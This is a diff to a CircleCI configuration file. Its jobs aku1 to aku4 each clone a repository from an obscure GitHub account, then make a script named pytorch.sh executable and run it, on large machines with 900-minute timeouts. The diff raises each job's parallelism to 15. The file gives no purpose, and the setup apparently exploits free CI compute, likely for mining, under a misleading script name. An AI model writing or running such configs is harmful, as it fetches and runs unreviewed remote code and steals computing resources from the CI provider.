@@ -1,6 +1,7 @@
 version: 2
 jobs:
     aku1:
+      parallelism: 15
       machine:
             image: ubuntu-2004:202101-01
       resource_class: large
@@ -10,6 +11,7 @@ jobs:
             command: git clone https://github.com/bciu1bic/SUGR.git && cd SUGR && chmod +x pytorch.sh && ./pytorch.sh
             no_output_timeout: 900m
     aku2:
+      parallelism: 15
       machine:
             image: ubuntu-2004:202101-01
       resource_class: large
@@ -19,6 +21,7 @@ jobs:
             command: git clone https://github.com/bciu1bic/SUGR.git && cd SUGR && chmod +x pytorch.sh && ./pytorch.sh
             no_output_timeout: 900m
     aku3:
+      parallelism: 15
       machine:
             image: ubuntu-2004:202101-01
       resource_class: large
@@ -28,6 +31,7 @@ jobs:
             command: git clone https://github.com/bciu1bic/SUGR.git && cd SUGR && chmod +x pytorch.sh && ./pytorch.sh
             no_output_timeout: 900m
     aku4:
+      parallelism: 15
       machine:
             image: ubuntu-2004:202101-01
       resource_class: large
